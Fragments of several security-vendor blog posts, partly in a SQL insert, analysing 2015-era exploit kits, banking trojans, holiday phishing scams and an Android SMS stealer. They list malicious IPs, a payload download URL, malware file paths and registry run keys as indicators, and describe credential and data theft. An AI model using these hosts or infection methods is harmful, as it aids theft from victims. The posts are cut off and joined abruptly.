The early stage of the campaign triggered Angler signatures from a variety of sources. As can be seen below, the code features the \"malware.dontneedcoffee.com\" test that has been common to Angler.\r\n \r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\nLater stages of the campaign showed more expected Neutrino behavior: where the first stage after the infected website was initially an Angler-alike landing page, the injected code instead directs users to an HTML page that loads a malicious Flash object. This can be clearly seen below in the side-by-side comparison.\r\n \r\n\r\n\r\n\r\nInfected Sites and Landing Pages\r\n\r\nMany of the sites serving this Neutrino campaign were registered under .CZ, the top-level domain (TLD) for the Czech Republic. Since full list is too long to include here, we have created a Pastebin with the data.\r\n\r\nWe saw landing pages served up from these IPs:\r\n185.86.77.52\r\n89.38.146.229\r\n37.157.195.55\r\n45.32.238.202\r\n185.12.178.219\r\n89.38.144.75 \r\nThe list of landing page domains is again too long to reproduce here, so please see our Pastebin for the data.\r\n\r\n \r\n\r\nPayloads\r\n\r\nWhile we did not observe a malicious payload from the \"Angler\" behavior, we found the later stage of the campaign delivered a CyrptoWall 4.0 payload. Shown below is the notice from the locker malware.\r\n \r\n\r\n\r\n\r\n\r\nGeographic Distribution\r\n\r\n\r\nThe geographic distribution of clients affected by this campaign is somewhat more dispersed than the Sundown campaign, though the majority of users were located in the US.\r\n \r\n\r\n\r\n\r\n\r\nMalware Command and Control\r\n\r\n\r\nIn addition to Sundown and Neutrino (with a case of multiple personality disorder), we also identified Necurs and Radamant callback activity on the AMS network. We include details of this activity below.\r\n\r\nNecurs Activity\r\n\r\nNecurs is a fairly well-known rootkit that is often distributed by EKs and spam e-mails.

The malware family in this case is the information stealing Trojan Spymel and involved a .NET executable signed with a legitimate DigiCert issued certificate.    The infection cycle typically starts with a malicious JavaScript file that arrives in a ZIP archive via e-mail attachment. Once the user opens the JavaScript file, it will download and install the malware executable on the victim machine.

What would the holiday season be without yuletide cheer, excessive commercialization and of course…security predictions? Yes, it’s time to join my colleagues in the security industry, peer into my magical crystal ball and provide a glimpse of what is to come. Grab a nice hot beverage, curl up next to the fire and enjoy!    PII is the new hotness  2015 continued the trend of major retail data breaches resulting in bulk debit and credit card theft, but it also marked a shift that will accelerate in 2016. In the coming year, expect attackers to move away from targeting financial information and instead target personally identifiable information (PII). In 2015, we continued to see credit/debit card theft at the likes of America’s Thrift Stores, The Trump Hotel Collection, Hilton Hotel properties, Service Systems Associates, Hershey Park, Harbortouch and White Lodging, but in 2015 we also learned of major breaches in the healthcare (Anthem and CareFirst BlueCross BlueShield) and government (Office of Personnel Management) sectors that targeted PII. The quest for PII is being driven by two separate groups of attackers. While nation states desire PII for espionage, criminals are also shifting to PII as it is generally more valuable than credit and debit cards, which are getting more challenging to harvest in bulk due to greater awareness of the problem and new technology. Why would a social security number be of greater value than a credit card number, which can be used directly to procure goods and services? PII is highly sought after in the underground as it can be leveraged to commit financial fraud such as applying for credit, submitting false medical/insurance claims or filing fraudulent tax refunds. Whereas credit cards can be easily cancelled, changing one’s name, address and social security number generally isn’t an option, so the stolen data remains valuable for a longer period of time. The shift will be motivated in part by the push to move to Chip and PIN (aka EMV) debit and credit cards, which combat RAM scraping malware with tokenization. Don’t however expect credit and debit card fraud to disappear entirely as EMV technology has seen slow adoption in the US, despite an October 2015 deadline and the technology does nothing to combat card not present (online) theft. In 2016, attackers will increasingly target sectors known to store bulk PII including finance, healthcare and government entities to harvest valuable PII.    Trusted Partner Attacks   Breaking in through the front door isn’t always the best option as it tends to be be well defended. The same is true in cyber attacks. A head on assault is expected, but companies rely on a plethora of technology partners and often communicate with them through trusted digital channels. History suggests that enterprises aren’t doing enough to ensure that trusted partners maintain their security to the same standards that would be demanded if those services were delivered internally. In the past we have seen this with the Target breach which occurred when Fazio Mechanical, an HVAC vendor was compromised. Likewise, the OPM breach began with a compromise at KeyPoint Government Solutions. Compromised partner networks aren’t always used to directly access another network but can also play an indirect role in a broader attack. For example, attackers that ultimately targeted JPMorgan Chase, Scottrade and E-Trade for money laundering also compromised G2 Web Services LLC, which specialized in monitoring and blocking fraudulent banking transactions. Once inside the G2 network, they could ensure that their money laundering schemes went undetected. Enterprises are increasingly outsourcing technology to streamline costs in areas that are not a core focus. For attackers targeting a supplier that often has lesser security controls than the larger entity that it serves, a successful compromise can be a gold mine. Not only does the breach provide a backdoor into the original target, but it also opens doors to other enterprises being serviced by the same vendor. Hackers have learned from successful attacks exploiting such relationships and will accelerate their focus in this area in 2016. Enterprises need to extend security policies and procedures beyond their own systems and personnel. Trusted partners should be expected to adhere to the same security controls and be subjected to audit and penetration tests to ensure that they are adhering to agreed upon standards.    Ransomware 2.0 goes corporate  Ransomware has managed to hit a sweet spot. Users are all too willing to begrudgingly pay an expensive but not excessive ransom in exchange for the return of their precious data. Even the FBI are recommending that it’s easier to pay than fight. The wildly profitable CryptoLocker has attracted many clones since it was largely knocked offline following Operation Tovar. Many of these clones, including more popular variants such as CryptoWall and TorrentLocker largely followed the proven formula but we’re starting to see variations such as ransomware focused on Linux and mobile platforms. The former is especially important as it’s more likely to impact the websites and code repositories of enterprises, who in our experience are also very willing to pay up rather than risk losing critical intellectual property. Expect ransomware to become increasingly corporate focused in 2016 and as it does, enterprises won’t get away with paying consumer rates. The criminals behind the ransomware campaigns are savvy and once they realize that they’ve locked up source code and financial documents that haven’t been properly backed up, you can expect prices to skyrocket…and be paid.    The extortion data breach  The Sony Pictures, Ashley Madison and Hacking Team breaches all share a common theme – the goal of the attacks was to humiliate the respective companies and perhaps inflict financial damage. There did not however appear to be a profit motive in any of the attacks. Sony Pictures, after already having proven to be a vulnerable target after two successful attacks against the Play Station Network, had it’s dirty laundry aired by hackers allegedly backed by the North Korean government as retaliation for producing a satirical movie about their leader. Ashley Madison and Hacking Team are believed to be the victims of hacktivists that disagreed with their corporate philosophies. Despite what has been stated by the media, there is little to suggest that these were sophisticated attacks. Rather, once the attackers were able to gain access to the internal network, they were able to roam freely and collect troves of sensitive data from email and file servers, which was then dumped online. Criminals have no doubt taken notice of the extreme damage that small teams have been able to achieve and know all too well that some would be willing to pay millions to stay out of the headlines. This is one prediction that is likely already taking place but we’ve yet to hear about it as the attackers have held up their part of the bargain to remain quiet in exchange for the hush money.    No AV? No problem.  Foreshadowing the death of antivirus (AV) is hardly a bold prediction. Even AV executives are calling for it. While you won’t see a sudden wholesale move away from AV, as it remains the first line of defense for corporate PCs, we’re now hearing with some regularity, CTOs shifting away from paid AV solutions to ‘good enough’ free AV or solutions baked in at the O/S level, such as Microsoft’s Windows Defender or Apple’s File Quarantine (aka XProtect). As enterprises adapt to the Post-PC era, running an end user device without AV is no longer seen as a risky bet. OS X machines rarely run AV in a corporate environment and on iOS devices it’s not even an option. Enterprises realize that AV is focused on known vulnerabilities and they must free budget dollars to shift to more dynamic security controls capable of identifying and protecting against 0day and targeted attacks. With limited budgets, expect fewer enterprises to open the checkbook for host based AV, instead reallocating the funds to solutions such as network/cloud based sandboxing solutions.    Android finally cleans up it’s act  Android is well on it’s way to becoming the Windows of the mobile malware world. With 99% of mobile infections, Android is the only game in town when it comes to infected tablets and smartphones. Love it or hate it, Apple’s walled garden and refusal to allow downloads from third party app stores has paid security dividends. Sure, Google Play has Bouncer and he’s done a fine job of keeping the miscreants out, but that’s of limited value when users are willing to go to shady Chinese app stores to save a buck on Candy Crush. Google clearly knows that this will hurt them in the long run, especially in the enterprise space and began making changes with Marshmallow, the latest Android flavor when they switched to Granular App Permissions to make it more clear what control an app ultimately gains when installed. This however was a small step and Google will need to get much more aggressive going forward. Not wanting to lose ground in the enterprise, where Apple has now pivoted, they have little choice. While cutting off third party app store access altogether would alienate too much of the user base, expect the next iteration of Android to to start cracking down on third party app stores. Since Jelly Bean 4.2, embedded cloud based anti-virus scanning was added through the Verify Apps feature. While yet another improvement, this is clearly not enough as we regularly identify and blog about apps from alternate Android app stores that are malicious in nature. Google will need to take more drastic steps and a likely change is restricting the permissions available to apps not vetted through the Google Play submission process.  Expect side-loaded apps requesting Administrator permissions to become a thing of the past.  Some developers will push back, but Google will have little choice if they want to get malware under control. Google will also begin to mandate acceptable timeframes for patches and firmware upgrades, which are now largely under the control of the OEM partners. It does little good when new security features are added, but they’re unavailable to users with non-Nexus devices. These steps won’t eliminate Android malware, especially with Android’s slow O/S upgrade cycle, but they will raise the bar for third party app stores, just as Bouncer did for Google Play.    Terrorists catch the hacking bug  This last prediction is one that saddens me to write, but I feel is inevitable and one that can’t be ignored. Terror organizations are continually searching for new avenues to instill fear and they require significant funding to further their hateful agendas. Skilled hackers can aid on both fronts. Cyber attacks can clearly be used by terrorists to obtain intelligence for future attacks and we’re already seeing early signs of cyber attacks being used to cause physical damage. Last year, hackers caused significant damage to a German steel mill when they disabled systems responsible for controlling a blast furnace. This wasn’t just kids playing around either, as the attacks reportedly required substantial knowledge of industrial control systems in order to succeed. With almost all industries reliant on computerized systems, the potential attack surface is enormous. Hacking is also extremely lucrative. The CrytoLocker ransomware authors for example were able to make millions in just a few short months. Such potential is surely in the sights of terror organizations, especially those such as ISIS, which have shown a new affinity for being tech savvy when it comes to recruiting and propaganda. Sadly, terrorists won’t necessarily need to acquire the necessary skills themselves as there are no shortage of cyber criminals all too willing to rent their skills out to the highest bidder and look the other way.    Password reuse attacks decline  And now for some good news. Password reuse attacks will begin to decline. Attackers are quite happy to compromise virtually any site even if it’s not the endgame as they can generally recover information and resources that will aid in other attacks. It’s always of great benefit for an attacker when they’re able to uncover a database of unencrypted usernames and passwords, because human nature suggests that those same credentials are used at many, many other sites. Most people use a handful of passwords at best, therefore attackers will write scripts to attempt automated logins at popular social networking, banking, etc. sites to see if the credentials can be reused. This presents a real challenge for end users as they have no control over how their credentials are stored or secured once they’re turned over and in the event of a compromise, changing passwords to every site where those same credentials were used is generally an impossibility. Think of your favorite password that you’ve used over the years. How many sites have you used it on? You lost count, didn’t you. Fortunately, this is starting to change thanks in large part to the smartphone. Smartphones can be many things but they make for a handy secure, always with you, data repository. As such, people are starting to adopt password managers such as 1Password, LastPass, etc., as they have user friendly smartphone apps that present a convenient option for always having sensitive data such as passwords within easy reach. Advancements in biometrics are also helping the cause with consumer grade fingerprint scanners now becoming a standard feature on modern smartphones. This not only makes accessing that password repository quicker and more user friendly, but also finally makes it an option to do away with passwords altogether. While not as user friendly, most major Internet layers are also adding two-factor authentication as a standard option. Finally, the average user has realistic authentication options that don’t involve sticky notes.    Say goodbye to browser plugins  The love affair with browser plugins has been on the decline and we’re finally at a point where the average user can do away with them once and for all. Flash had a particularly tough year after Firefox disabled the plugin by default after the Hacking Team breach revealed the existence of new Flash 0days. Facebook’s Security Chief also piled on asking “Adobe to announce an end-of-life date for Flash”. This after Steve Jobs famously refused to include Flash on iOS, claiming that it had been the “number one reason Macs crash” and had “one of the worst security records”. The bashing certainly isn’t unfounded with browser plugins remaining the number one way that Exploit Kit authors target PCs, primarily targeting Java, Flash and PDF vulnerabilities. At least for websites, Flash is on life support, Java died a couple of years ago and PDF plugins are no longer required as bowser vendors have baked in native support. Competitors like SilverLight never fully caught on and web apps that would historically have used custom plugins for playing video or screen sharing, have now migrated to HTML5. Not supporting plugins was one things that mobile browsers got right from the get go. In 2016, expect all major browsers to get serious about finally killing off plugin support by default.    The encryption showdown  Encrypted communications have long been the bane of law enforcement and those in the intelligence communities. As privacy concerns mount, thanks in part to the Snowden revelations, leveraging strong encryption for messaging and data storage is no longer the realm of geek speak. It is an expected feature and is quickly becoming a differentiating feature. iOS now encrypts data by default and Android while lagging behind, is fighting to get there. Popular chat applications like WhatsApp tout encryption as a key feature and Apple’s iMessage app, which features end-to-end encryption and no central key store, is often referenced by law enforcement when arguing for a ‘back door’. 2016 will be the year this battle comes to a head. While politicians used to dance gingerly around the topic given the privacy abuses exposed by the Snowden revelations, recent terrorist attacks have brought this issue front and center. Multiple pieces of legislation are sure to be introduced that will propose weakened encryption protocols or procedures to grant law enforcement access to decrypted communications as needed. As we’ve learned however, you can’t be ‘mostly secure’ any more than you can be ‘kind of pregnant’. Weakening encryption to benefit law enforcement will also reduce security for everyone and if the US government mandates a ‘backdoor’, you can be rest assured that China, Russia, [pick a country] will be demanding the same for their citizens. This is one battle that will have serious repercussions for years to come. Here’s to hoping that Apple, Google, Microsoft, Yahoo! and the like manage to prevail.    Should be another action packed year on the cyber security front. See you next year!

The malware authors are leveraging Google Cloud Servers to host the initial Spy Banker Downloader Trojan, which is responsible for downloading and installing Spy Banker Trojan Telax.    The attackers are using social engineering tactics, such as offering coupon vouchers and free software applications like WhatsApp and Avast antivirus, to lure the end user into downloading and installing the malicious payload. Social networking sites Facebook and Twitter are primarily being used to spread a shortened URL (using bit.ly service) that points to a Google Cloud Server hosting the malicious payload with .COM or .EXE file extensions.  Campaign Details  The attack starts with a shortened URL posted on a social networking site or via drive by download from malicious sites posing to offer premium software or coupons. Below is a recent attack chain where the user clicked on a link shared via Facebook that lead to the download of Telax payload:       	  		  			  		  		  			Figure 1: Spy Banker Telax served via Facebook  		  	            The bit.ly link points to a PHP file hosted on the Google Cloud Server that does a 302 redirect to download the initial Spy Banker Downloader Trojan payload.    The executable file receitanet.com is posing to be Brazil\'s federal revenue online tax returns service. We have also seen other themes offering fake premium software applications and discount vouchers as seen from the file names below.    Malicious payload file names:      	americanas.com  	americanas.exe  	app.ricardoeletro.com  	atube.com  	avast.com  	AvastPro.exe  	baixaki.com  	receitanet.com  	ricardoeletro.com  	setup.exe  	submarino.com  	voucher.americanas.com  	voucher.mercadolivre.com  	voucher.ricardoeletro.com  	walmart.com  	web.whatsapp.com  	whatsapp_setup.exe  	WhatsApp_Setup.exe    Below are the statistics (credit: Bit.ly) on the number of users clicks that were recorded for the attack campaign shared in Figure 1:       	  		  			  		  		  			Figure 2: User clicks on the malicious bit.ly link  		  	    Majority of the target users were lead to the malicious bit.ly link from Facebook as seen below:       	  		  			  		  		  			Figure 3: Source for the bit.ly link visits  		  	      In addition to social networking sites, we also saw users arriving to the Spy Banker Telax payloads hosted on Google Cloud servers from the following sites:    	aquinofinal[.]com  	aquiredire[.]com  	brasildareceita[.]com  	mundodareceita[.]com  	ofertasplusdescontos[.]com    All but one of the domains listed above are repossessed by Go Daddy and are no longer active.

It is important to note that the success of this attack depends primarily on the social engineering tactics in convincing the end user into opening the downloaded payload.     Spy Banker Trojan Telax analysis  The initial file that gets downloaded is the Spy Banker Downloader Trojan. The Downloader Trojan is responsible for downloading & executing the final payload from a list of predetermined URLs as seen below:       	  		  			  		  		  			Figure 7: Downloader Trojan hardcoded URLs  		  	    The final payload, Spy Banker Trojan Telax, is a Delphi executable that is capable of stealing Banking credentials targeting Portuguese users. Upon execution, Telax injects malicious code into legitimate Visual Basic Compiler (vbc.exe) process.

The malware authors are actively pushing out new versions of Telax (latest version 4.7) binaries and are abusing Google Cloud Servers to host the payload for infection. There is no vulnerability exploit being used in this campaign and the attackers are solely relying on social engineering to infect the end users.

For some, it’s a time for family and extravagant meals. For others, it’s a time for charity and giving more than your best to your partner. Yet for others still...it’s time to shop. Black Friday is once again upon us. That magical time of the year when we take to the high street or internet, hoping to find a good deal on that new device you’ve been window shopping for the last month. Users beware! There is more harm than good that can be done from clicking on what appears to be a good deal. During this time of the year, the internet runs amok with an increase of phishing and scam websites looking to exploit your consumer instincts.    The Zscaler ThreatLabZ team has been monitoring a subset of opt-in data to discover a correlation between shopping activity and scams. As an effect of increased shopping behavior, we\'ve observed a steady number of scams clicked on by users. Scammers take notice of trending topics as well and us consumer’s impaired judgement to cast a wide net of phishing, fraud, and scam attacks meant to capitalize on the shopping season. Whether you are using a mobile device or your home PC, the uptick in shopping trends remains relevant.                     As shown in the graphs, the trend in phishing activity tends to rise with the amount of online shopping traffic, which comes with the added risk of scammers taking advantage of a consumers better judgement.                        Vawtrak Botnet Scam  Our first case study illustrates the danger of these fraudulent deals. The botnet, Vawtrak (also known as NeverQuest and Snifula), is a powerful information stealing backdoor Trojan that has been gaining momentum over past few months. It primarily targets user\'s bank account via online banking websites. We’ve come across numerous reports, where users begin the infection cycle through spam e-mails promising a sales deal. This case appears to be no different, as we see the Pony Trojan Downloader being leveraged to download the Vawtrak payload.      	salesdeal.magentochile[.]cl/f1.exe    VirusTotal has this threat marked as a fairly well known sample with a score of 32/55 at the time of research. Vawtrak is a treacherous botnet that is known to target the user’s saved banking credentials or even keylog for other passwords. Vawtrak achieves this by manipulating key Windows processes and lowering security settings to ensure that its Command and Control traffic can be reached.    Savvy users that suspect themselves to be afflicted with this threat should look for similar suspicious files:    	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\Temp\\~DFECDDE19F2005BD31.TMP  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Kapag  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\KuhaKqigd.dll  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\KuhaKqigd.exe  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Qucuz  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Sofolq  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Uoqet  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\YidaLboz    The folder name in the ‘Local’ Directory will be named randomly. The fastest option to make sure you are targeting the right directory is to have a quick look at what programs are AutoStarting in the registry. In this instance, the following location was observed:      	HKU\\[USER-ID]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WopuVdax: \"regsvr32.exe \"C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\KuhaKqigd.dll\"\"                   Once the infection is successful, the Internet Settings are lowered to accommodate suspicious beaconing activity. The following was observed in our execution of the malicious sample:      	HKU\\S-1-5-21-4274511564-889519498-3811658521-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\2500: 0x00000000  	HKU\\S-1-5-21-4274511564-889519498-3811658521-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\2500: 0x00000003       Upon successful manipulation of the Internet Settings, command and control attempts are made.                       The threat responds with a list of locations to fetch configuration files as well as other malicious payloads. In the instance we observed, we received the keylogging Botnet, NetWired.    NetWired leaves two files actively running which beacon to suspicious destinations. These processes collect and exfiltrate stolen data to the threat actors.                         The NetWired botnet communicates with the following server IPs from our research:      	109[.]163[.]226[.]153  	213[.]152[.]162[.]99  	31[.]184[.]194[.]138  	46[.]161[.]1[.]172  	46[.]165[.]208[.]108  	46[.]20[.]33[.]82  	62[.]102[.]148[.]181  	95[.]211[.]229[.]148      Free iPhone6 scams    Lots of scam sites are offering a free iPhone 6 to lure victims into click fraud attacks. Scam sites also ask for personal information like phone number, address, or e-mail address. Victims end up losing their personal information that can be further leveraged into future scams. The below screenshot shows scammers doing their best to make a site look like an official Apple site.                       Some scams also ask for shipping fees to collect additional funds as well as sensitive information.               Scammers leverage brand names to provide an air of legitimacy to their scam websites. Some examples we have seen:      	http[:]//apple[.]com[-]freegiveaway[.]com  	http[:]//applestore[.]officialfreegiveway[.]com/  	http[:]//facebook[.]officialfreegiveway[.]com/  	http[:]//8sd5ug[.]getafreeiphone6splustoday[.]com/  	http[:]//giveaways[.]xyz/iphone[-]giveaway/  	http[:]//iphone6[.]howtogetafree[.]eu/           We recently covered a fake app offering early access to Amazon.com Black Friday and Cyber Monday offers and deals. With the rise in mobile device usage for browsing and shopping activities, we expect to see more and more instances of such fake applications with exciting offers targeting mobile users.    How can online shoppers protect themselves?  Thanksgiving marks the start of the holiday shopping season which continues through Christmas. The Zscaler ThreatLabZ team is working around the clock to ensure that our customers do not fall prey to such malicious activity.    We highly recommend that all online shoppers exercise extreme caution and follow our holiday season shopping security checklist:    	Inspect the source of emails with enticing shopping deals. Be wary of any suspicious attachments  	Steer clear of unofficial mobile application stores  	Ensure HTTPS/secure connections to online retailers and banking sites  	Check the authenticity of the URL or website address before clicking on a link  	Stay away from e-mailed invoices - this is often a social engineering technique used by cyber criminals  	Do not use insecure public WiFi for shopping  	Use two-factor authentication whenever possible especially on sensitive accounts such as those used for banking  	Always ensure that your operating system and web browser have the latest security patches installed  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	Backup your documents and media files  	Review the Identity Theft Guide and FAQ from the Federal Trade Commission.

The malware executable file is a Microsoft Visual C++ 6.0 compiled binary with custom packed content stored in the executable\'s overlay section. Kelihos installs WinPcap, a legitimate and commonly used Windows packet capture library at the following locations:    	%system32%\\winpcap.dll  	%system32%\\Packet.dll  	%system32%\\drivers\\npf.sys    Note: %system32% is c:\\windows\\system32    It uses hard coded User-Agents from the following list when communicating with the remote host:       	  		  			  		  		  			Crafted User-Agent  		  	    Kelihos tries to steal the login credentials of FTP and POP3 applications by monitoring the network traffic of the victim\'s machine using the installed WinPcap libraries. The bot checks for the presence of the following applications on the victim machine and attempts to steal login credentials, digital currency and other information:      	3D-FTP  	Bitcoin  	BitKinex  	BlazeFtp  	Bullet Proof FTP  	Classic FTP  	Core FTP  	CuteFTP  	Cyberduck  	Directory Opus  	FFFTP  	FileZilla  	Frigate3  	FTPGetter  	LeapFTP  	FTPRush  	xterm  	PuTTY  	SecureFX  	SmartFTP  	Bitcoin  	BitKinex      The malware extracts stored information such as usernames, passwords and host names from the following browsers:      	Google\\Chrome  	Chromium  	ChromePlus  	Bromium  	Nichrome  	Comodo  	RockMelt  	CoolNovo  	MapleStudio\\ChromePlus  	Yandex    Kelihos communicates to Command & Control (C&C) servers using HTTP via messages encrypted using the Blowfish symmetric-key algorithm.       	  		  			  		  		  			Post Infection Communication  			   			   		  	      Conclusion         Nuclear EK remains a worthy rival to Angler EK, with widespread campaigns, regular exploit payload updates, new obfuscation techniques and new malware payloads. The end malware payload we saw in this campaign was the information stealing Kelihos bot which has extremely low AV detection.            ThreatLabZ is actively monitoring new Nuclear EK infections in the wild and ensuring that Zscaler customers are protected.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (121, 'Chinese Government Website Compromised, Leads To Angler', 'ThreatLabz', 'November 03, 2015', 'Introduction\r\nDespite a recent takedown targeting the Angler Exploit Kit (EK), it\'s back to business as usual for kit operators. On 30-October-2015, ThreatLabZ noticed a compromised Chinese government website that led to the Angler Exploit Kit with an end payload of Cryptowall 3.0. This compromise does not appear targeted and the compromised site was cleaned up within 24 hours. We have noticed some recent changes to Angler, as well as the inclusion of newer Flash exploits. A set of indicators for this compromise is at the end of this post.\r\n \r\nCompromised Site\r\nThe \"Chuxiong Archives\" website, www.cxda[.]gov.cn, was compromised with injected code. The site has a similar look and feel to both the Chuxiong Yi Prefecture and Chuxiong City websites and appears somewhat inactive, but surprisingly the site was remediated in less than 24 hours. The full infection cycle from compromised site to encrypted payload is shown in the fiddler session below.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 1. Infection cycle\r\n		\r\n	\r\n\r\nThe injected code was before the opening HTML tag and was heavily obfuscated. The code, shown below, is very similar to other recent compromises we\'ve observed and was present on every page of the site, suggesting a complete site compromise.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 2. Injected script\r\n		\r\n	\r\n\r\nConsistent with other recent examples, the injected code appears to target Internet Explorer (IE) since Firefox and Chrome consistently throw errors when attempting to execute the code and no redirection occurs. IE has no issues executing the code, however, which unsurprisingly decodes to an iframe leading to an Angler EK landing page:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 3. Decoded injected code\r\n		\r\n	\r\n\r\nWhile we did not have access to the server-side code, it likely retrieves landing page URLs from a remote server since we observed iframes leading to multiple different Angler domains within a brief period of time.\r\n\r\nLanding Page\r\nThe landing page for Angler is immediately recognizable, but with some notable recent changes. For example, instead of using a long block of around seven-character long strings inside divs tag, the newer landing pages use \'li\' tags and most of the strings are only about two characters long. Additionally, there\'s a conspicuous \'triggerApi\' function toward the top of the main script block:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 4: Short strings and triggerApi function\r\n		\r\n	\r\n\r\nOutside of these changes, the functionality of the landing page appears unchanged, and the goal is naturally to serve up a malicious SWF:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 5. Decoded landing page SWF objects\r\n		\r\n	\r\n\r\n\r\nMalicious SWF - CVE-2015-7645\r\nKafeine already broke the news that Angler is exploiting Flash 19.0.0.207, and we can corroborate that with the samples we\'ve observed.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 6. Flash 19.0.0.207 being exploited\r\n		\r\n	\r\n\r\nIn fact, we compared the sample from his recent post with one obtained from this infection and the structure is identical, with very few changes in the actionscript. The biggest change we saw was in the embedded binary data.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 7. SWF structure, 30-Oct sample on the left, Kafeine\'s sample on the right\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 8. Comparison of binary data, 30-Oct sample on the left, Kafeine\'s sample on the right\r\n		\r\n	\r\n\r\n\r\nUpon successful exploit cycle, a new CryptoWall 3.0 variant from the crypt13 campaign is downloaded and installed on the target machine. The image below shows a decrypted Command & Control (C&C) communication message from the CryptoWall variant which also contains the total number of files encrypted on the target system:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 9. CryptoWall 3.0 C&C message reporting encrypted file count\r\n		\r\n	\r\n\r\n\r\n\r\nFinal Thoughts\r\nAs stated, this seems to be business as usual for Angler EK operators. While these attacks were not targeted in nature, this is the first instance where we saw EK operators leveraging a government site to target end users. One interesting observation is that we no longer see any Diffie-Helman POST exchange to prevent replaying captured sessions for offline analysis. Additionally, there was a much larger number of C&C servers than we\'ve previously observed, and some of the domain names seem to suggest multi-use hosts (e.g.: spam, bitcoin mining, etc). Note that none of the C&C servers are pseudo-randomly generated domains. ThreatLabZ will continue to track new developments with the Angler Exploit Kit.\r\n \r\nIndicators of Compromise\r\n\r\n\r\n\r\n	\r\n		\r\n			Domain\r\n			IP

This malicious app portrays itself as a document with an icon resembling Microsoft Word.    Due to the ubiquitous nature of mobile devices, its no wonder that PC based malware techniques are appearing in mobile domains. In early Windows malware attacks, attackers would often name the malicious files with eye-catching titles and use common icons to entice victims to open the file. We\'re seeing this same practice used for Android based malware.    Overview:  The malware portrays itself as a data file with an icon similar to that used by Microsoft Word documents and is entitled \'资料\' (Data). It runs with Administrative access and hence cannot be easily uninstalled. Once installed, the malware scans the device for SMS messages and other personally identifiable information such as the IMEI number, SIM card number, Device ID, victim\'s contact information,  etc. and sends this to the attacker via email.       	  		  			  		  		  			Malicious APK posing as Microsoft Word File  		  	        Technical Details:  Once the malware is installed, it appears on the Android home screen as shown below:       	  		  			  		  		  			Microsoft Word Icon  		  	        Initiation:  As soon as victim tries to start the app, it shows an explicit error stating \"Installation errors, this software is not compatible with the phone\" and the icon then disappears from the device screen.       	  		  			  		  		  			Fake Error Message  		  	        When this error is being displayed, the app executes a few major functions as noted below:    	Sends SMS messages to a hard-coded number.  	Starts an Android service, named MyService.  	Starts an asynchronous thread (SmsTask) which runs in background.  	Starts another thread named MailTask, which also operates in background.  	Calls phone numbers specified by Attacker.           Sends SMS  Initially malware tries to send the victim\'s device IMEI code in a message body to a hardcoded number.            	  		  			  		  		  			Calling SendMsg function  		  	        Assets.getInstallFlag gets the IMEI (or ESN number in case of CDMA devices)         	  		  			  		  		  			IMEI code fetching  		  	      And finally sends the message.            	  		  			  		  		  			Sending Message  		  	      MyService Service:  The main task performed by MyService is to collect all the SMS messages from inbox of the victim\'s device.  Once that is done, it stores all the messages in its local logs.       	  		  			  		  		  			Service fetching inbox messages  		  	      SmsTask Thread:  Apart from logging SMS messages, MyService was not sending these messages anywhere. This functionality is exhibited in the SmsTask thread.    SmsTask will also read the SMS messages and exfiltrates them.       	  		  			  		  		  			Fetching inbox messages  		  	      Once the messages are collected, the app then sends them to attacker via email.    	  		  			  		  		  			Calling SendMail method  		  	      A username and password for an email id were found hard-coded in the malware.       	  		  			  		  		  			SendMail functionality  		  	      MailTask Thread:  MailTask\'s main role is to collect contact information from the victim\'s device and send it to attacker via the same functionality explained in case of SmsTask.         	  		  			  		  		  			SmsTask Thread  		  	      Sending Mail:  The app sets up an SMTP host on port 465 for sending email.       	  		  			  		  		  			Sending Mail  		  	      localMimeMessage contains the necessary data to be sent to attacker via email. In the case of SmsTask as mentioned above, localMimeMessage\'s body contains an SMS message list and in the MailTask instance, it contains contact numbers from victim\'s device.    Calling Functionality:  The malware was also designed to call phone numbers provided by an attacker via SMS.  It has a broadcast receiver registered to trigger whenever a new SMS is delivered.  The malware reads the SMS received from the attacker and acts accordingly.    In one instance, malware was trying to fetch phone numbers received in SMS messages and then calling them, as shown in screenshot below:       	  		  			  		  		  			Broadcast Receiver  		  	      We were able to confirm that the campaign was initiated on October 10, 2015 and almost 300+ users had fallen prey to this malware. The attacker was able to successfully retrieve message details and contact lists from the infected users.    The following screenshots shows the list of emails received by the attacker:       	  		  			  		  		  			Inbox  		  	      Further, each email titled \"Message list\" consists of full SMS conversations from the victims phones and email with subject \"Contact list\" contains a list of all the phone numbers fetched from victims contact diaries.       	  		  			  		  		  			Messages from victim\'s device  		  	           	  		  			  		  		  			Contacts from victim\'s phone  		  	    There were 300+ such emails found in the C&C admin panel. Such malware creates a significant privacy & financial risk as it obtains contact information and private SMS messages.    Prevention:  It is recommended that users download apps only from official Android stores like the Google Play store. If you are infected with malware, you can follow the steps mentioned in our previous blog for removing the malicious app.', 'Malware;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/infostealer-apk-posing-microsoft-word-document');

